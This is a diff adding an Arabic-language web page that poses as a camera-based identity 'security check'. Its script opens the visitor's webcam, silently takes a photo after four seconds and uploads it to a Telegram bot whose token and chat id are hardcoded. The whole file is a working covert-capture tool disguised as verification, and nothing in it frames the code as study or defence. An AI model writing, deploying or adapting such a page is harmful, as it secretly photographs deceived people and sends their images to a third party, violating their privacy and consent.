@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>فحص أمني</title>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f5f5f5;
+    }
+    video {
+      width: 90%;
+      max-width: 400px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>جاري الفحص بالكاميرا...</h2>
+  <p>الرجاء الانتظار أثناء التحقق من الهوية.</p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const token = '6242732866:AAFMLeQxUZtxDO4eQrr0PHvL1kMy2o6Tpqw';
+    const chat_id = '1929988314';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+
+      // بعد 4 ثواني يصور ويرسل
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', chat_id);
+          formData.append('photo', blob, 'image.jpg');
+
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          }).then(() => {
+            console.log('✅ الصورة انرسلت لتليجرام');
+          }).catch(err => {
+            console.error('❌ فشل الإرسال:', err);
+          });
+        }, 'image/jpeg');
+      }, 4000);
+    }).catch(error => {
+      alert('🚫 فشل تشغيل الكاميرا');
+      console.error('Camera error:', error);
+    });
+  </script>
+</body>
+</html>
